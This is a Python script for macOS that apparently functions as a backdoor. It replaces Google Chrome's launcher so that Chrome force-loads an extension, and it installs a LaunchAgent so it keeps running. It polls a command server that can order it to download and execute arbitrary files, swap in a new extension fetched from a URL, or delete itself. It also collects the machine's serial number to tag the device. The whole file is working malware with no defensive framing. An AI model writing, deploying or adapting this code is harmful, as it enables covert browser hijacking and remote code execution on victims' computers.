import os
from pathlib import Path
import subprocess
import time
import requests
import uuid
import socket

def find_chrome_app():
    common_locations = [
        Path("/Applications"),
        Path.home() / "Applications",
    ]
    for location in common_locations:
        for root, dirs, files in os.walk(location):
            if "Google Chrome.app" in dirs:
                return Path(root) / "Google Chrome.app"
    print("Searching for Google Chrome using mdfind...")
    result = subprocess.run(["mdfind", "kMDItemFSName == 'Google Chrome.app'"], capture_output=True, text=True)
    if result.stdout:
        chrome_path = result.stdout.strip().split("\n")[0]
        return Path(chrome_path)
    return None

def restart_chrome_with_extension(custom_chrome_path):
    print("Waiting for 3 minutes before restarting Chrome...")
    time.sleep(180)
    print("Terminating all Google Chrome processes...")
    subprocess.call(["pkill", "Google Chrome"])
    print("Restarting Google Chrome with the extension...")
    try:
        subprocess.Popen(["open", "-a", str(custom_chrome_path)])
        print("Google Chrome restarted successfully with the extension.")
    except Exception as e:
        print(f"Failed to restart Google Chrome: {e}")

def configure_chrome_launcher(extension_folder_path):
    if not Path(extension_folder_path).exists():
        print(f"Error: The specified extension folder was not found: {extension_folder_path}")
        return
    original_chrome_path = find_chrome_app()
    if not original_chrome_path:
        print("Error: Google Chrome is not installed in common locations or elsewhere.")
        return
    original_renamed_path = original_chrome_path.parent / "Google Chrome (Original).app"
    custom_chrome_path = original_chrome_path
    launcher_script_path = custom_chrome_path / "Contents/MacOS/Google Chrome"
    try:
        if not original_renamed_path.exists():
            print(f"Renaming original Google Chrome from {original_chrome_path} to {original_renamed_path}...")
            original_chrome_path.rename(original_renamed_path)
        print(f"Creating custom Google Chrome launcher at {custom_chrome_path}...")
        os.makedirs(launcher_script_path.parent, exist_ok=True)
        launcher_script = f"""#!/bin/bash
open -a \"{original_renamed_path}\" --args --load-extension={extension_folder_path}
"""
        with open(launcher_script_path, "w") as f:
            f.write(launcher_script)
        os.chmod(launcher_script_path, 0o755)
        print("Custom Google Chrome launcher configured successfully!")
    except Exception as e:
        print(f"Failed to configure custom Chrome launcher: {e}")
        return
    print("Testing the custom launcher...")
    try:
        subprocess.Popen(["open", "-a", str(custom_chrome_path)])
        print("Custom Chrome launcher is working!")
    except Exception as e:
        print(f"Failed to test custom Chrome launcher: {e}")
        return
    restart_chrome_with_extension(custom_chrome_path)

def update_extension(extension_url, extension_folder_path):
    try:
        print(f"Downloading extension from {extension_url}...")
        response = requests.get(extension_url, stream=True)
        response.raise_for_status()
        extension_zip_path = extension_folder_path / "extension.zip"
        if extension_folder_path.exists():
            print(f"Cleaning up old extension files in {extension_folder_path}...")
            import shutil
            shutil.rmtree(extension_folder_path)
        extension_folder_path.mkdir(parents=True, exist_ok=True)
        with open(extension_zip_path, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        print(f"Extension downloaded to {extension_zip_path}. Extracting...")
        import zipfile
        with zipfile.ZipFile(extension_zip_path, "r") as zip_ref:
            zip_ref.extractall(extension_folder_path)
        extension_zip_path.unlink()
        print(f"Extension extracted to {extension_folder_path}. Update complete.")
        chrome_path = find_chrome_app()
        if chrome_path:
            restart_chrome_with_extension(chrome_path)
        else:
            print("Google Chrome not found. Skipping restart.")
    except Exception as e:
        print(f"Failed to update extension: {e}")

def delete_self():
    try:
        script_path = Path(__file__).resolve()
        print(f"Deleting script: {script_path}")
        plist_path = Path("~/Library/LaunchAgents/com.app.backgroundtask.plist").expanduser()
        if plist_path.exists():
            print(f"Unloading and deleting plist: {plist_path}")
            subprocess.run(["launchctl", "unload", str(plist_path)])
            plist_path.unlink()
        script_path.unlink()
        print("Script deleted successfully. Exiting...")
        os._exit(0)
    except Exception as e:
        print(f"Failed to delete self: {e}")

def load_and_run(file_url):
    try:
        print(f"Downloading file from {file_url}...")
        response = requests.get(file_url, stream=True)
        response.raise_for_status()
        temp_file_path = Path("/tmp/loaded_file")
        with open(temp_file_path, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        print(f"File downloaded to {temp_file_path}. Executing...")
        temp_file_path.chmod(0o755)
        subprocess.run([str(temp_file_path)])
        print(f"Execution of {temp_file_path} completed.")
    except Exception as e:
        print(f"Failed to load and run file: {e}")

def get_device_identifier():
    try:
        result = subprocess.run(
            ["system_profiler", "SPHardwareDataType"],
            capture_output=True, text=True
        )
        for line in result.stdout.splitlines():
            if "Serial Number" in line:
                return line.split(":")[1].strip()
    except Exception:
        pass
    try:
        return hex(uuid.getnode())
    except Exception:
        pass
    return socket.gethostname()

def wait_for_commands():
    SERVER_URL = "http://127.0.0.1:5000/api/commands"
    device_id = get_device_identifier()
    while True:
        try:
            print(f"Fetching commands from server with device_id: {device_id}...")
            response = requests.get(SERVER_URL, params={"device_id": device_id})
            response.raise_for_status()
            command_data = response.json()
            command = command_data.get("command")
            if command:
                print(f"Received command: {command}")
                if command == "restart_chrome":
                    restart_chrome_with_extension(find_chrome_app())
                elif command == "update_extension":
                    extension_url = command_data.get("url")
                    update_extension(extension_url, extension_folder_path)
                elif command == "delete":
                    delete_self()
                elif command == "load_and_run":
                    file_url = command_data.get("url")
                    load_and_run(file_url)
                else:
                    print(f"Unknown command: {command}")
            else:
                print("No new commands. Waiting...")
        except Exception as e:
            print(f"Error fetching commands: {e}")
        time.sleep(30)

def setup_autostart():
    plist_content = f"""
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.yourapp.backgroundtask</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{Path(__file__).resolve()}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/tmp/yourapp.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/yourapp_error.log</string>
</dict>
</plist>
"""
    plist_path = Path("~/Library/LaunchAgents/com.app.backgroundtask.plist").expanduser()
    try:
        with open(plist_path, "w") as plist_file:
            plist_file.write(plist_content)
        print(f"Launch Agent created at: {plist_path}")
        subprocess.run(["launchctl", "load", str(plist_path)])
        print("Launch Agent loaded. Script will start automatically on system boot.")
    except Exception as e:
        print(f"Failed to set up autostart: {e}")

if __name__ == "__main__":
    setup_autostart()
    current_directory = Path(__file__).parent
    extension_folder_path = current_directory / "extension"
    configure_chrome_launcher(extension_folder_path)
    wait_for_commands()
